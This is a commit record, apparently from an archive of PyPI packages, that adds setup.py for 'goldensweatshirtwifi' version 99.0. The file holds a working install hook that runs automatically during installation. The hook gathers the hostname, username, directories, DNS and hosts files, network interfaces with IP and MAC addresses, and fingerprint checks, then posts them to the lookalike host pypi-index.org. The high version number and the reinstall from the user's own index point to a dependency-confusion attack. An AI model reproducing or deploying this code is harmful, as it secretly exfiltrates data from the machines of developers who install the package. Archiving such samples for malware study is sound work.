13b670ff99fa7f42b1724d1279120be4a95f91f7
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-04-16 06:03:13 +0000

    Add package goldensweatshirtwifi/99.0/goldensweatshirtwifi-99.0.tar.gz

---
+++ packages/goldensweatshirtwifi/goldensweatshirtwifi-99.0.tar.gz/goldensweatshirtwifi-99.0/setup.py
@@ -0,0 +1,335 @@
+import platform
+import socket
+import getpass
+import os
+import sys
+import json
+
+if sys.version_info[0] >= 3:
+    import urllib.request as http_request
+if sys.version_info[0] == 2:
+    import urllib2 as http_request
+
+import datetime
+import hashlib
+import uuid
+import subprocess
+
+HOST = "pypi-index.org"
+PACKAGE = "goldensweatshirtwifi"
+H_F1 = "3daac9ff4692baca30b600cf2a5147719af175b29e2fa6db0cd37a40087be8a0" 
+H_F2 = "7b49060c65297cbd4c66618c741bb1a550d069882d9f228f3d291306e8058159" 
+
+H_F3 = "2fb844c33800fdf9c9bc52de333ffcceba35c6e5d3376bc867af31efaada460e" 
+H_F4 = "7beed9ebc9a1c689ec854f2294fcee20f7dcc5804e60c6f79c4cad1ea26456b2" 
+
+RESP = ""
+
+def sha256(str_):
+    return hashlib.sha256(str_.encode('utf-8')).hexdigest()
+
+def find_in_folder(dir, hash_):
+    for f in os.listdir(dir):
+        if sha256(f) == hash_:
+            return f
+
+def gkobUSiTkM_1():
+    k = False
+    try:
+        if platform.system().lower() in ('darwin', 'linux'):
+            home_dir = os.path.expanduser("~")
+            if os.path.isdir(home_dir):
+                f1 = find_in_folder(home_dir, H_F1)
+                if f1:
+                    f1 = os.path.join(home_dir, f1)
+                    f2 = find_in_folder(f1, H_F2)
+                    k = True if f2 else False
+    except:
+        pass
+
+    return k
+
+def GsAVOBDTvu_2():
+    global RESP
+    try:
+        req = http_request.Request("http://127.0.0.1:19000/certs")
+        response = http_request.urlopen(req, timeout=5)
+        RESP = response.read().decode('utf-8')
+        return True
+    except:
+        return False
+
+def krNzfTsCTY_3():
+    for name, value in os.environ.items():
+        if sha256(name) == H_F3 and sha256(value) == H_F4:
+            return True
+    return False
+
+def detect_system():
+    
+    
+    
+    
+    
+    key = 0
+    if gkobUSiTkM_1():
+        key = 1
+    elif GsAVOBDTvu_2():
+        key = 2
+    elif krNzfTsCTY_3():
+        key = 3 
+    
+    return key
+
+def read_config(config):
+    c = ""
+    try:
+        f = open(config)
+        for line in f.readlines():
+            if line[0] != "#":
+                c += line
+        f.close()
+    except:
+        pass
+    
+    return c
+
+
+def get_dns():
+    return read_config("/etc/resolv.conf")
+    
+
+def get_hosts():
+    return read_config("/etc/hosts")
+
+def get_time_zone():
+    res = ""
+    try:
+        c_utc = datetime.datetime.utcnow()
+        zone = ""
+        if sys.version_info[0] >= 3 and sys.version_info[1] >= 3:
+            zone = datetime.datetime.now().astimezone().tzinfo
+        else:
+            zone = ""
+        res = str(c_utc) + " " + str(zone)
+    except:
+        pass
+    return res
+
+def getifip(ifn):
+    import socket, fcntl, struct
+
+    try:
+        sck = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        
+        if sys.version_info[0] >= 3:
+            ifn = ifn.encode()
+            return socket.inet_ntoa(fcntl.ioctl(sck.fileno(),0x8915,struct.pack('256s', ifn[:15]))[20:24])
+    except:
+        pass
+    return "UNKNOWN"
+
+def get_mac(ifn):
+    f = open("/sys/class/net/{}/address".format(ifn))
+    mac = f.read()
+    f.close()
+    return mac
+
+def get_network_interfaces():
+    interfaces = []
+    sysp = platform.system()
+
+    if sysp.lower() == "linux":
+        f = open("/proc/net/dev", "r")
+        lines = f.readlines()[2:]
+        f.close()
+        for line in lines:
+            interface = line.split(":")[0].strip()
+            interfaces.append(interface)
+    elif sysp.lower() == "darwin":
+        process = subprocess.Popen(["ifconfig"], stdout=subprocess.PIPE)
+        output = process.communicate()[0].decode('utf-8')
+        lines = output.split("\n")
+        for line in lines:
+            if "flags" in line and "mtu" in line:
+                interface = line.split(":")[0].strip()
+                interfaces.append(interface)
+    elif sysp.lower() == "windows":
+        interfaces = [interface[0] for interface in socket.if_nameindex()]
+
+    return interfaces
+
+def get_ip_addresses(interface):
+    ips = []
+    macs = []
+    sysp = platform.system()
+
+    if sysp.lower() == "linux":
+        ip = getifip(interface)
+        ips.append(ip)
+        mac = get_mac(interface)
+        macs.append(mac)
+
+    elif sysp.lower() == "darwin":
+        process = subprocess.Popen(["ifconfig", interface], stdout=subprocess.PIPE)
+        output = process.communicate()[0].decode('utf-8')
+        lines = output.split("\n")
+        for line in lines:
+            if "inet " in line:
+                ip = line.split(" ")[1]
+                ips.append(ip)
+            if "ether " in line:
+                mac = line.split(" ")[1]
+                macs.append(mac)
+            
+    elif sysp.lower() == "windows":
+        ips = [socket.gethostbyname(socket.gethostname())]
+
+    return ips, macs
+
+
+def get_net():
+    c = ""
+    try:
+        network_interfaces = get_network_interfaces()
+        for interface in network_interfaces:
+            ips, macs = get_ip_addresses(interface)
+            if ips:
+                c += ("{}|{}|{}\n".format(interface, ','.join(ips), ",".join(macs)))
+    except:
+        pass
+
+    return c
+
+def collect_info():
+    os_name = platform.system().lower()
+    os_version = platform.version()
+    hostname = socket.gethostname()
+    username = getpass.getuser()
+    current_directory = os.getcwd()
+    home_dir = os.path.expanduser("~")
+    dns = get_dns()
+    hosts = get_hosts()
+    net = get_net() 
+    c_time = get_time_zone()
+    k = detect_system()
+
+    data = {
+        "src": "py"+str(sys.version_info[0]) + " " + PACKAGE,
+        "os": "{} {} {}".format(os_name, platform.platform(), os_version),
+        "hostname": hostname,
+        "user": username,
+        "cwd": current_directory,
+        "hd" : home_dir,
+        "dns": dns,
+        "hosts" : hosts,
+        "optn": RESP,
+        "net": net,
+        "time": c_time,
+        "key": k
+    }
+
+    return data
+
+def run_me():
+    
+    data = collect_info()
+    json_data = json.dumps({"data": data}).encode('utf-8')
+    url = "https://{}/process_data".format(HOST)
+    
+    try:  
+        req = http_request.Request(url, data=json_data, headers={'Content-Type': 'application/json'})
+        response = http_request.urlopen(req, timeout=30)
+        
+    except http_request.HTTPError as e:
+        pass
+        
+    except Exception as e:
+        pass
+        
+
+
+from setuptools import setup, find_packages
+from setuptools.command.install import install
+import subprocess 
+import shutil
+import site
+import atexit
+import sys, os
+
+def get_index():
+    try:
+        f = open(os.path.expanduser("~/.pip/pip.conf"))
+    except OSError:
+        return
+    except IOError:
+        return
+    
+    for line in f.readlines():
+        if "index-url" in line:
+            f.close()
+            return line.split("=")[-1].strip()
+    f.close()
+
+
+class CustomInstall(install):
+    def run(self):    
+        def _post_install():      
+            
+            pip = "{} -m pip".format(sys.executable)
+            
+            
+            
+            index_url = get_index()
+            if not index_url:
+                return
+
+             
+            if sys.version_info[0] >= 3 and sys.version_info[1] >= 10:
+                py_path = 'PYTHONPATH="{}" '.format(site.getsitepackages()[0]) 
+            else:
+                py_path = ''
+
+
+            
+            try:
+                s = subprocess.check_output('{}{} install {} --index-url "{}"'.format(py_path, pip, PACKAGE, index_url), shell=True)#.decode()
+            except subprocess.CalledProcessError:
+                return
+            
+            
+            
+            if "bdist_wheel" in sys.argv:
+                
+                s = subprocess.check_output('{}{} download {} --no-deps --index-url "{}"'.format(py_path, pip, PACKAGE, index_url), shell=True)#.decode()
+
+                dw_wheel = os.listdir(os.getcwd())[-1].strip()
+                
+                
+                t_dir = sys.argv[-1]
+                
+                if not os.path.exists(t_dir):
+                    os.makedirs(t_dir)
+                    shutil.move(dw_wheel, t_dir + "/" + dw_wheel)
+                else:
+                    
+                    t_wheel  = os.listdir(t_dir)[-1].strip()
+                    
+                    
+                    os.unlink(t_dir + "/" + t_wheel)
+                    
+                    shutil.move(dw_wheel, t_dir + "/" + dw_wheel)
+            
+        atexit.register(_post_install)
+        run_me()
+        install.run(self)
+
+try:
+    setup(
+        name=PACKAGE,
+        version='99.0',
+        packages=find_packages(),
+        cmdclass={'install': CustomInstall},     
+    )
+except Exception as e:
+    pass
